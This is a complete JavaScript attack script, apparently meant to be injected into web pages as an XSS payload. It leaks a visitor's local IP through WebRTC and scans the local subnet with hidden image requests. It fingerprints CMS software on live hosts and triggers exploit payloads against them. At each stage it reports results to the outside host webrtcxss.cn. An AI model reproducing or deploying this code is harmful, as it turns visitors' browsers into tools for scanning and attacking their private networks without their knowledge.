var onlyString           = "abc";
var ipList               = [];
var survivalIpLIst       = [];
var deathIpLIst          = [];
var sendsurvivalIp       = "http://webrtcxss.cn/Api/survivalIp";
var snedIteratesIpUrl    = "http://webrtcxss.cn/Api/survivalPortIp";
var snedIteratesCmsIpUrl = "http://webrtcxss.cn/Api/survivalCmsIp";
var sendExistenceVul     = "http://webrtcxss.cn/Api/existenceVul";
var webrtcxss = {
    webrtc        : function(callback){
        var ip_dups           = {};
        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        var mediaConstraints  = {
            optional: [{RtpDataChannels: true}]
        };
        var servers = undefined;
        if(window.webkitRTCPeerConnection){
            servers = {iceServers: []};
        }
        var pc = new RTCPeerConnection(servers, mediaConstraints);
        pc.onicecandidate = function(ice){
            if(ice.candidate){
                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; 
                if(ip_dups[ip_addr] === undefined)
                callback(ip_addr);
                ip_dups[ip_addr]    = true;
            }
        };
        pc.createDataChannel("");
        pc.createOffer(function(result){
            pc.setLocalDescription(result, function(){});
        });
    },
    getIp        : function(){
        this.webrtc(function(ip){
            ipList.push(ip);
        });
    }
}
webrtcxss.getIp();
function iteratesIp(){
	stage(1)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendsurvivalIp, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('survivalip='+ ipList.join("-") + '&onlystring=' + onlyString);
    for(var i = 0;i < ipList.length;i++){
        incompleteIp = ipList[i].split(".");
        incompleteIp.pop();
        incompleteIp = incompleteIp.join(".");
        for(var j = 1;j < 255;j++){
            var ip = incompleteIp + "." + j;
            var imgTag = document.createElement("img"); 
            imgTag.setAttribute("src","http://" + ip + "/favicon.ico");
            imgTag.setAttribute("onerror","javascript:deathIpLIst.push('"+ip+"')");
            imgTag.setAttribute("onload","javascript:survivalIpLIst.push('"+ip+"')");
            imgTag.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(imgTag);
        }
    }
}
setTimeout("iteratesIp()",2000);
(function(){
    if(deathIpLIst.length + survivalIpLIst.length == 254){
        snedIteratesIpData(survivalIpLIst);
    }else{
        setTimeout(arguments.callee,5000);
    }
})();
function snedIteratesIpData(ip){
	if(deathIpLIst.length == 254){
		return false;
	}
	stage(2)
    ip = ip.join("-")
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var cmsPath = JSON.parse(ipAjax.responseText).path;
            for(var key in cmsPath){
                for(var i = 0;i < survivalIpLIst.length;i++){
                    var scriptTag = document.createElement("script"); 
                    scriptTag.setAttribute("src","http://" + survivalIpLIst[i] + cmsPath[key]);
                    scriptTag.setAttribute("data-ipadder",survivalIpLIst[i]);
                    scriptTag.setAttribute("data-cmsinfo",key);
                    scriptTag.setAttribute("onload","javascript:vulnerabilityIpList(this)");
                    document.getElementsByTagName("body")[0].appendChild(scriptTag);
                }
            }
        }
    }
    ipAjax.open('POST', snedIteratesIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('iplist='+ip+'&onlystring='+onlyString);
}
function vulnerabilityIpList(info){
	stage(3)
    ipAjax = new XMLHttpRequest();
    ipAjax.onreadystatechange = function(){
        if(ipAjax.readyState == 4 && ipAjax.status == 200){
            var vulCmsInfo = ipAjax.responseText;
            var img = document.createElement("img"); 
            img.setAttribute("scr",vulCmsInfo);
            img.setAttribute("style","display:none;");
            document.getElementsByTagName("body")[0].appendChild(img);
            setTimeout(function(){
                var scriptTag = document.createElement("script");
                scriptTag.setAttribute("src","http://"+info.getAttribute('data-ipadder')+"/1.js");
                scriptTag.setAttribute("data-cmsinfo",info.getAttribute("data-cmsinfo"));
                scriptTag.setAttribute("data-vulip",info.getAttribute('data-ipadder'));
                scriptTag.setAttribute("onload","javascript:vulConfirm(this)");
                document.getElementsByTagName("body")[0].appendChild(scriptTag);
            },2000);
        }
    }
    ipAjax.open('POST', snedIteratesCmsIpUrl, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('existenceCmsIp='+ info.getAttribute("data-ipadder") + '&existenceCmsInfo=' + info.getAttribute("data-cmsinfo") + '&onlystring=' + onlyString);
}
function vulConfirm(cmsConfirmInfo){
	stage(4)
    ipAjax = new XMLHttpRequest();
    ipAjax.open('POST', sendExistenceVul, false);
    ipAjax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    ipAjax.send('cms='+ cmsConfirmInfo.getAttribute("data-cmsinfo") + '&vulip='+ cmsConfirmInfo.getAttribute("data-vulip") +'&onlystring=' + onlyString);
}
function stage(num){
	var updataStage = document.createElement("img");
	updataStage.setAttribute("src","http://webrtcxss.cn/Api/stage/onlystring/"+onlyString+"/updata/"+num);
	updataStage.setAttribute("style","display:none;");
	document.getElementsByTagName("body")[0].appendChild(updataStage);
}